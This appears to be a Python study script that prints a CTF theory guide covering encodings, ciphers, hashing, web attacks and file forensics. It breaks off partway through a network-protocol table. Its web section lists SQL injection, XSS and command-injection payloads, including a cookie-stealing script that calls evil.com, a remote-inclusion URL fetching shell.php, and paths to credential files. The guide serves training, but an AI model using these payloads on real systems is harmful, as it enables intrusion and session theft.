"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║            TCS HACKQUEST - COMPLETE THEORY & CONCEPTS GUIDE                      ║
║                    Everything You Need to Know                                    ║
╚══════════════════════════════════════════════════════════════════════════════════╝

This file contains ALL important theoretical concepts for CTF challenges.
Understanding these will help you instantly recognize and solve problems!

Run this file and navigate through topics.
"""

# ═══════════════════════════════════════════════════════════════════════════════════
#                    SECTION 1: ENCODING FUNDAMENTALS
# ═══════════════════════════════════════════════════════════════════════════════════

def encoding_theory():
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SECTION 1: ENCODING FUNDAMENTALS                                    ║
║                    Understanding Data Representation                             ║
╚══════════════════════════════════════════════════════════════════════════════════╝

⚠️ CRITICAL CONCEPT: Encoding ≠ Encryption!
   • Encoding: Converting data format (REVERSIBLE, NO KEY NEEDED)
   • Encryption: Securing data (NEEDS KEY TO DECRYPT)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 1.1 ASCII (American Standard Code for Information Interchange)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Standard that assigns numbers (0-127) to characters
• Every letter, number, symbol has a unique code

KEY VALUES TO MEMORIZE:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Character    │  Decimal  │  Hex   │  Binary      │  Notes                      │
├───────────────┼───────────┼────────┼──────────────┼─────────────────────────────┤
│  'A'          │    65     │  0x41  │  01000001    │  Start of uppercase         │
│  'Z'          │    90     │  0x5A  │  01011010    │  End of uppercase           │
│  'a'          │    97     │  0x61  │  01100001    │  Start of lowercase         │
│  'z'          │   122     │  0x7A  │  01111010    │  End of lowercase           │
│  '0'          │    48     │  0x30  │  00110000    │  Start of digits            │
│  '9'          │    57     │  0x39  │  00111001    │  End of digits              │
│  Space        │    32     │  0x20  │  00100000    │  Space character            │
│  Newline      │    10     │  0x0A  │  00001010    │  Line feed (LF)             │
└───────────────┴───────────┴────────┴──────────────┴─────────────────────────────┘

💡 TRICK: Uppercase to lowercase = Add 32 (or XOR with 0x20)
   Example: 'A' (65) + 32 = 'a' (97)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 1.2 HEXADECIMAL (Base 16)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Base-16 number system using: 0-9 and A-F
• Each hex digit = 4 bits
• 2 hex digits = 1 byte (8 bits)

WHY USED?
• Compact way to represent binary data
• Used in memory addresses, colors, file data

CONVERSION:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Decimal  │  0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15     │
│  Hex      │  0   1   2   3   4   5   6   7   8   9   A   B   C   D   E   F     │
│  Binary   │ 0000 0001 0010 0011 0100 0101 0110 0111 1000 1001 1010 1011...     │
└─────────────────────────────────────────────────────────────────────────────────┘

HOW TO RECOGNIZE:
• Contains only 0-9 and A-F (or a-f)
• Often prefixed with 0x or \\x
• ALWAYS even number of characters (2 chars = 1 byte)

EXAMPLE:
  "Hello" in ASCII: 72 101 108 108 111
  "Hello" in Hex:   48 65  6C  6C  6F
  Combined:         48656C6C6F

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 1.3 BASE64 ENCODING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Encoding scheme using 64 printable characters
• Converts binary data to text-safe format

CHARACTER SET:
  A-Z (26) + a-z (26) + 0-9 (10) + '+' + '/' = 64 characters
  Plus '=' for padding

HOW IT WORKS:
  1. Take 3 bytes (24 bits) of input
  2. Split into 4 groups of 6 bits each
  3. Map each 6-bit group to a Base64 character
  4. If input not multiple of 3, add '=' padding

SIZE CHANGE:
  • Input: 3 bytes → Output: 4 characters
  • Base64 output is ~33% larger than input

HOW TO RECOGNIZE:
  ✓ Characters: A-Z, a-z, 0-9, +, /
  ✓ Often ends with = or ==
  ✓ Length is multiple of 4
  ✓ Looks like random text with mixed case

EXAMPLE:
  "Hi" → "SGk="
  "Hello" → "SGVsbG8="
  "flag" → "ZmxhZw=="

⚠️ COMMON MISTAKE: Base64 is NOT encryption! Anyone can decode it.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 1.4 BINARY (Base 2)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Base-2 number system using only 0 and 1
• How computers actually store ALL data

KEY CONCEPTS:
  • 1 bit = 0 or 1
  • 8 bits = 1 byte
  • 1 byte = 256 possible values (0-255)

BINARY TO DECIMAL:
  Binary: 01001000
  = 0×128 + 1×64 + 0×32 + 0×16 + 1×8 + 0×4 + 0×2 + 0×1
  = 64 + 8 = 72
  = ASCII 'H'

HOW TO RECOGNIZE:
  ✓ Contains ONLY 0s and 1s
  ✓ Often in groups of 8 (bytes)
  ✓ May have spaces between groups

EXAMPLE:
  "Hi" in binary:
  01001000 01101001
  (72)     (105)
   H        i

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 1.5 URL ENCODING (Percent Encoding)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Encoding special characters for URLs
• Replaces unsafe characters with %XX (hex value)

WHY NEEDED?
• URLs can only contain certain characters
• Spaces, &, =, ?, etc. have special meaning

COMMON ENCODINGS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Character  │  URL Encoded  │  Character  │  URL Encoded                       │
├─────────────┼───────────────┼─────────────┼────────────────────────────────────┤
│  Space      │  %20 or +     │  '          │  %27                               │
│  !          │  %21          │  "          │  %22                               │
│  #          │  %23          │  &          │  %26                               │
│  $          │  %24          │  =          │  %3D                               │
│  %          │  %25          │  ?          │  %3F                               │
│  /          │  %2F          │  <          │  %3C                               │
│  :          │  %3A          │  >          │  %3E                               │
└─────────────┴───────────────┴─────────────┴────────────────────────────────────┘

HOW TO RECOGNIZE:
  ✓ Contains % followed by two hex digits
  ✓ Example: Hello%20World = "Hello World"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 1.6 ENCODING DETECTION CHEAT SHEET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

┌─────────────────────────────────────────────────────────────────────────────────┐
│  IF YOU SEE                          │  IT'S PROBABLY                          │
├──────────────────────────────────────┼─────────────────────────────────────────┤
│  Only 0-9, A-F (even length)         │  Hexadecimal                            │
│  A-Z, a-z, 0-9, +, /, = at end       │  Base64                                 │
│  Only 0 and 1 (groups of 8)          │  Binary                                 │
│  %XX patterns                        │  URL Encoding                           │
│  &#XX; or &#xXX; patterns            │  HTML Entities                          │
│  \\xXX patterns                       │  Hex escape sequences                   │
│  Numbers 65-122                      │  Decimal ASCII values                   │
└──────────────────────────────────────┴─────────────────────────────────────────┘
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    SECTION 2: CRYPTOGRAPHY FUNDAMENTALS
# ═══════════════════════════════════════════════════════════════════════════════════

def cryptography_theory():
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SECTION 2: CRYPTOGRAPHY FUNDAMENTALS                                ║
║                    The Science of Secret Communication                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 2.1 CAESAR CIPHER (Shift Cipher)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Oldest known cipher (used by Julius Caesar)
• Each letter shifted by fixed number of positions

HOW IT WORKS:
  Plaintext:  HELLO
  Shift:      +3
  Ciphertext: KHOOR

  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
  ↓ shift by 3
  D E F G H I J K L M N O P Q R S T U V W X Y Z A B C

SPECIAL CASE - ROT13:
  • Shift by 13 positions
  • Self-reversing! (Encode = Decode)
  • Because 13 + 13 = 26 (full alphabet)

HOW TO BREAK:
  • Only 26 possible shifts - try all of them!
  • Look for common words like "THE", "AND", "FLAG"
  • Frequency analysis (E is most common letter)

CTF HINT:
  If ciphertext starts with "UB10" or similar, try Caesar.
  UB shifted back 13 = HQ (our flag format!)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 2.2 XOR CIPHER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• XOR (Exclusive OR) - binary operation
• Extremely common in CTF and real cryptography

XOR TRUTH TABLE:
┌─────────────────────────────────────────────────────────────────────────────────┐
│    A    │    B    │  A XOR B                                                    │
├─────────┼─────────┼─────────────────────────────────────────────────────────────┤
│    0    │    0    │    0      (same = 0)                                        │
│    0    │    1    │    1      (different = 1)                                   │
│    1    │    0    │    1      (different = 1)                                   │
│    1    │    1    │    0      (same = 0)                                        │
└─────────┴─────────┴─────────────────────────────────────────────────────────────┘

💡 KEY PROPERTY: XOR is SELF-REVERSING!
   A XOR B XOR B = A
   
   This means: Plaintext XOR Key = Ciphertext
               Ciphertext XOR Key = Plaintext

EXAMPLE:
  Plaintext:  'H' = 01001000
  Key:        'K' = 01001011
  XOR Result:       00000011 = ASCII 3 (ciphertext)
  
  To decrypt: 00000011 XOR 01001011 = 01001000 = 'H'

SINGLE-BYTE XOR:
  • Same key byte used for entire message
  • Only 256 possible keys (0-255)
  • Easy to bruteforce!

MULTI-BYTE XOR:
  • Key repeats: KEY KEY KEY...
  • If key length known, break into chunks

KNOWN PLAINTEXT ATTACK:
  If you know part of the plaintext (like "flag{"):
  Ciphertext XOR Known_Plaintext = Key

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 2.3 HASHING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• One-way function: Input → Fixed-size output
• CANNOT be reversed (unlike encryption)
• Same input ALWAYS produces same output

COMMON HASH ALGORITHMS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Algorithm  │  Output Length  │  Example Hash                                   │
├─────────────┼─────────────────┼─────────────────────────────────────────────────┤
│  MD5        │  32 hex chars   │  5d41402abc4b2a76b9719d911017c592              │
│  SHA1       │  40 hex chars   │  aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d      │
│  SHA256     │  64 hex chars   │  2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c...   │
│  SHA512     │  128 hex chars  │  (very long)                                    │
│  bcrypt     │  60 chars       │  $2a$10$... (starts with $2a$, $2b$, $2y$)      │
└─────────────┴─────────────────┴─────────────────────────────────────────────────┘

HASH PROPERTIES:
  1. Deterministic: Same input → Same output
  2. One-way: Cannot reverse to get input
  3. Collision resistant: Hard to find two inputs with same hash
  4. Avalanche effect: Small change → Completely different hash

HOW TO "CRACK" HASHES:
  • Rainbow tables: Precomputed hash → password mappings
  • Dictionary attack: Hash common words, compare
  • Bruteforce: Try all combinations
  • Use CrackStation.net for common hashes!

USES IN CTF:
  • Verify file integrity
  • Password storage (find the original)
  • Proof of work challenges

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 2.4 SYMMETRIC vs ASYMMETRIC ENCRYPTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SYMMETRIC ENCRYPTION:
  • Same key for encryption AND decryption
  • Fast, used for bulk data
  • Examples: AES, DES, 3DES, RC4
  
  [Plaintext] --[Key]--> [Ciphertext] --[Same Key]--> [Plaintext]

ASYMMETRIC ENCRYPTION:
  • Two keys: Public key (encrypt) + Private key (decrypt)
  • Slow, used for key exchange
  • Examples: RSA, ECC, DSA
  
  [Plaintext] --[Public Key]--> [Ciphertext] --[Private Key]--> [Plaintext]

RSA IN CTF:
  • Based on difficulty of factoring large numbers
  • Components: n (modulus), e (public exponent), d (private exponent)
  • If n is small or has weak factors → Can be broken
  • Tool: RsaCtfTool, FactorDB

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 2.5 VIGENÈRE CIPHER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Polyalphabetic cipher (multiple Caesar ciphers)
• Uses a keyword to determine shift for each letter

HOW IT WORKS:
  Plaintext:  HELLO
  Keyword:    KEY (repeats: KEYKE)
  
  H + K(10) = R
  E + E(4)  = I
  L + Y(24) = J
  L + K(10) = V
  O + E(4)  = S
  
  Ciphertext: RIJVS

HOW TO BREAK:
  1. Find key length (Kasiski examination, Index of Coincidence)
  2. Split ciphertext into key-length groups
  3. Each group is Caesar cipher - use frequency analysis
  4. Or use dCode.fr online tool!
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    SECTION 3: WEB SECURITY FUNDAMENTALS
# ═══════════════════════════════════════════════════════════════════════════════════

def web_security_theory():
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SECTION 3: WEB SECURITY FUNDAMENTALS                                ║
║                    Understanding Web Vulnerabilities                             ║
╚══════════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 3.1 HTTP PROTOCOL BASICS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS HTTP?
• HyperText Transfer Protocol
• Foundation of web communication
• Client sends REQUEST → Server sends RESPONSE

HTTP REQUEST STRUCTURE:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  GET /page.html HTTP/1.1          ← Request Line (Method, Path, Version)       │
│  Host: example.com                ← Headers                                    │
│  User-Agent: Mozilla/5.0                                                        │
│  Cookie: session=abc123                                                         │
│  Accept: text/html                                                              │
│                                   ← Empty line                                  │
│  [Request Body - for POST]        ← Body (optional)                             │
└─────────────────────────────────────────────────────────────────────────────────┘

HTTP METHODS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  GET     │  Retrieve data (parameters in URL)                                  │
│  POST    │  Send data (parameters in body)                                     │
│  PUT     │  Update/create resource                                             │
│  DELETE  │  Delete resource                                                    │
│  HEAD    │  Like GET but only headers returned                                 │
│  OPTIONS │  Show allowed methods                                               │
└─────────────────────────────────────────────────────────────────────────────────┘

HTTP RESPONSE CODES:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  1xx  │  Informational                                                         │
│  2xx  │  Success (200 OK, 201 Created)                                         │
│  3xx  │  Redirect (301 Moved, 302 Found)                                       │
│  4xx  │  Client Error (400 Bad Request, 403 Forbidden, 404 Not Found)          │
│  5xx  │  Server Error (500 Internal, 503 Unavailable)                          │
└─────────────────────────────────────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 3.2 COOKIES & SESSIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT ARE COOKIES?
• Small pieces of data stored in browser
• Sent with every request to that domain
• Used for authentication, preferences, tracking

COOKIE ATTRIBUTES:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Attribute    │  Purpose                                                        │
├───────────────┼─────────────────────────────────────────────────────────────────┤
│  Name=Value   │  The actual data (session=abc123)                               │
│  Domain       │  Which domain can access (.example.com)                         │
│  Path         │  Which paths can access (/admin)                                │
│  Expires      │  When cookie is deleted                                         │
│  HttpOnly     │  Can't be accessed by JavaScript (security!)                    │
│  Secure       │  Only sent over HTTPS                                           │
│  SameSite     │  CSRF protection                                                │
└───────────────┴─────────────────────────────────────────────────────────────────┘

CTF COOKIE ATTACKS:
  1. Cookie contains user role: role=user → role=admin
  2. Cookie is Base64 encoded: decode, modify, re-encode
  3. Cookie is just a number: session=1 → session=0 (admin)
  4. JWT token manipulation (more advanced)

SESSIONS:
• Server-side storage linked to session ID
• Session ID stored in cookie
• Server looks up data using that ID

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 3.3 SQL INJECTION (SQLi)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Injecting malicious SQL code through user input
• Exploits poor input sanitization
• Can read, modify, or delete database data

HOW IT WORKS:
  Normal Query:
    SELECT * FROM users WHERE username='$input' AND password='$pass'
  
  If input = admin'--
    SELECT * FROM users WHERE username='admin'--' AND password='anything'
  
  The -- comments out the rest, bypassing password check!

TYPES OF SQL INJECTION:

1. IN-BAND (Classic):
   • Error-based: Errors reveal database info
   • Union-based: UNION SELECT to combine results

2. BLIND SQLi:
   • Boolean-based: True/false responses differ
   • Time-based: SLEEP() to detect true conditions

3. OUT-OF-BAND:
   • Data exfiltrated through DNS, HTTP requests

KEY PAYLOADS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Purpose              │  Payload                                                │
├───────────────────────┼─────────────────────────────────────────────────────────┤
│  Authentication bypass│  ' OR '1'='1'--                                         │
│  Authentication bypass│  admin'--                                               │
│  Comment out rest     │  --  or  #  or  /**/                                    │
│  Union attack         │  ' UNION SELECT null,null,null--                        │
│  Version detection    │  ' UNION SELECT @@version--                             │
│  Table enumeration    │  ' UNION SELECT table_name FROM information_schema.tables--│
│  Time-based blind     │  ' AND SLEEP(5)--                                       │
│  Boolean blind        │  ' AND 1=1-- (true) vs ' AND 1=2-- (false)              │
└───────────────────────┴─────────────────────────────────────────────────────────┘

UNION ATTACK STEPS:
  1. Find number of columns: ORDER BY 1, ORDER BY 2... until error
  2. Find displayable columns: UNION SELECT 1,2,3,4...
  3. Extract data: UNION SELECT username,password FROM users

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 3.4 CROSS-SITE SCRIPTING (XSS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Injecting malicious JavaScript into web pages
• Executes in victim's browser
• Can steal cookies, modify page, redirect user

TYPES OF XSS:

1. REFLECTED XSS:
   • Payload in URL/request
   • Server "reflects" it back in response
   • Requires victim to click malicious link
   
   Example: http://site.com/search?q=<script>alert('XSS')</script>

2. STORED XSS:
   • Payload stored in database
   • Executes for all users viewing that data
   • More dangerous - affects multiple victims
   
   Example: Comment field stores: <script>steal(document.cookie)</script>

3. DOM-BASED XSS:
   • Vulnerability in client-side JavaScript
   • Never sent to server
   • Payload in URL fragment (#)

KEY PAYLOADS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Basic alert          │  <script>alert('XSS')</script>                          │
│  Without script tag   │  <img src=x onerror=alert('XSS')>                       │
│  Event handler        │  <body onload=alert('XSS')>                             │
│  SVG vector           │  <svg onload=alert('XSS')>                              │
│  Cookie stealing      │  <script>new Image().src="http://evil.com/?c="+document.cookie</script> │
│  Input field          │  "><script>alert('XSS')</script>                        │
└─────────────────────────────────────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 3.5 DIRECTORY TRAVERSAL & LFI/RFI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DIRECTORY TRAVERSAL:
• Using ../ to navigate outside intended directory
• Access files not meant to be accessible

Example:
  Normal: http://site.com/view?file=report.pdf
  Attack: http://site.com/view?file=../../../etc/passwd

LOCAL FILE INCLUSION (LFI):
• Include local files in application
• Can read sensitive files
• Sometimes leads to code execution

Common targets:
  • /etc/passwd (Linux users)
  • /etc/shadow (password hashes - needs root)
  • C:\\Windows\\System32\\config\\SAM (Windows)
  • /var/log/apache2/access.log (log poisoning)
  • /proc/self/environ (environment variables)

REMOTE FILE INCLUSION (RFI):
• Include files from remote server
• More dangerous - can execute attacker's code
• Requires allow_url_include=On in PHP

Example:
  http://site.com/page?file=http://evil.com/shell.php

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 3.6 COMMAND INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS IT?
• Injecting OS commands through application input
• Application passes user input to system shell
• Can execute arbitrary commands on server

VULNERABLE CODE:
  <?php
  $output = shell_exec('ping ' . $_GET['ip']);
  echo $output;
  ?>

ATTACK:
  ?ip=8.8.8.8; cat /etc/passwd
  ?ip=8.8.8.8 && whoami
  ?ip=8.8.8.8 | ls -la

COMMAND SEPARATORS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Separator  │  Purpose              │  Example                                  │
├─────────────┼───────────────────────┼───────────────────────────────────────────┤
│  ;          │  Sequential execution │  ping 8.8.8.8; whoami                     │
│  &&         │  AND (if first succeeds)│  ping 8.8.8.8 && whoami                 │
│  ||         │  OR (if first fails)  │  invalidcmd || whoami                     │
│  |          │  Pipe output          │  cat file | grep flag                     │
│  `cmd`      │  Command substitution │  ping `whoami`                            │
│  $(cmd)     │  Command substitution │  ping $(whoami)                           │
│  \\n (0x0a)  │  Newline              │  ping%0awhoami                            │
└─────────────┴───────────────────────┴───────────────────────────────────────────┘
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    SECTION 4: STEGANOGRAPHY & FORENSICS
# ═══════════════════════════════════════════════════════════════════════════════════

def stego_forensics_theory():
    print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║              SECTION 4: STEGANOGRAPHY & FORENSICS                                ║
║                    Hidden Data & Digital Investigation                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 4.1 STEGANOGRAPHY FUNDAMENTALS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS STEGANOGRAPHY?
• Hiding secret data within innocent-looking files
• Goal: Nobody knows a secret message exists
• Different from encryption (which is obvious)

  Cryptography: "Xjuipsz" - obvious something is hidden
  Steganography: Normal looking image - secret hidden inside

COMMON HIDING TECHNIQUES:

1. LSB (Least Significant Bit):
   • Hide data in least significant bits of pixels
   • Human eye can't detect tiny color changes
   • Example: RGB(100, 150, 200) → RGB(101, 150, 201)
   
2. Appended Data:
   • Data added after file's end marker
   • File still displays normally
   • Extra data hidden at the end

3. Metadata:
   • Hidden in EXIF, comments, XMP data
   • Image looks normal, secret in properties

4. File-in-File:
   • ZIP/RAR hidden inside image
   • Change extension or use binwalk to extract

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 4.2 FILE SIGNATURES (Magic Bytes)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT ARE MAGIC BYTES?
• First few bytes that identify file type
• Operating systems use these, not just extension
• Can detect wrong extensions or hidden files

COMMON FILE SIGNATURES (MEMORIZE THESE!):
┌─────────────────────────────────────────────────────────────────────────────────┐
│  File Type    │  Hex Signature           │  ASCII/Notes                         │
├───────────────┼──────────────────────────┼──────────────────────────────────────┤
│  JPEG         │  FF D8 FF                │  Start of image                      │
│  PNG          │  89 50 4E 47 0D 0A 1A 0A │  .PNG....                            │
│  GIF          │  47 49 46 38             │  GIF8 (GIF87a or GIF89a)             │
│  PDF          │  25 50 44 46             │  %PDF                                │
│  ZIP          │  50 4B 03 04             │  PK.. (also DOCX, XLSX, APK)         │
│  RAR          │  52 61 72 21             │  Rar!                                │
│  7Z           │  37 7A BC AF             │  7z..                                │
│  EXE/DLL      │  4D 5A                   │  MZ                                  │
│  ELF (Linux)  │  7F 45 4C 46             │  .ELF                                │
│  MP3          │  49 44 33 or FF FB       │  ID3 or sync bits                    │
│  WAV          │  52 49 46 46             │  RIFF                                │
│  GZIP         │  1F 8B                   │  Compressed data                     │
│  BZ2          │  42 5A 68                │  BZh                                 │
└───────────────┴──────────────────────────┴──────────────────────────────────────┘

FILE END MARKERS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  JPEG End     │  FF D9                                                          │
│  PNG End      │  49 45 4E 44 AE 42 60 82 (IEND chunk)                           │
│  ZIP End      │  50 4B 05 06 (End of central directory)                         │
└───────────────┴─────────────────────────────────────────────────────────────────┘

CTF USE:
  • File has wrong extension? Check magic bytes!
  • Data after end marker? Extract hidden content!
  • File won't open? Magic bytes might be corrupted!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 4.3 METADATA ANALYSIS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS METADATA?
• "Data about data"
• Information stored within files
• Often overlooked but contains valuable clues

TYPES OF METADATA:

1. EXIF (Images):
   • Camera model, settings
   • Date/time taken
   • GPS coordinates
   • Thumbnail (might be different from main image!)
   • Comments, Author, Copyright

2. Document Metadata:
   • Author name
   • Creation/modification dates
   • Software used
   • Comments, revision history
   • Hidden text, tracked changes

3. Audio/Video:
   • Artist, album, title
   • Duration, bitrate
   • Recording software
   • Comments

CTF HIDING SPOTS:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Field             │  What to look for                                          │
├────────────────────┼────────────────────────────────────────────────────────────┤
│  Comment           │  Often contains flags or hints                             │
│  Author/Artist     │  Encoded data, usernames                                   │
│  Copyright         │  Hidden messages                                           │
│  GPS Coordinates   │  Location clues for OSINT                                  │
│  Thumbnail         │  Might show original/unedited image                        │
│  User Comment      │  Base64 or hex encoded data                                │
│  Description       │  Challenge hints                                           │
└────────────────────┴────────────────────────────────────────────────────────────┘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📚 4.4 NETWORK FORENSICS (PCAP ANALYSIS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WHAT IS A PCAP?
• Packet Capture file
• Records all network traffic
• Contains complete packet data

WHAT YOU CAN FIND:
  • Unencrypted credentials (HTTP, FTP, Telnet)
  • Transferred files
  • DNS queries (what sites were visited)
  • Email content (SMTP)
  • Chat messages
  • Attack signatures

COMMON PROTOCOLS IN CTF:
┌─────────────────────────────────────────────────────────────────────────────────┐
│  Protocol  │  Port  │  What to look for                                        │
├────────────┼────────┼──────────────────────────────────────────────────────────┤
│  HTTP      │  80    │  Credentials in POST, files in responses                 │
│  HTTPS     │  443   │  Usually encrypted (can't read without key)              │
│  FTP       │  21    │  USER and PASS commands in plaintext!                    │
│  Telnet    │  23    │  Everything in plaintext including passwords             │
│  SMTP      │  25    │  Email content, attachments                              │
│  DNS       │  53    │  Exfiltration via subdomains                             │
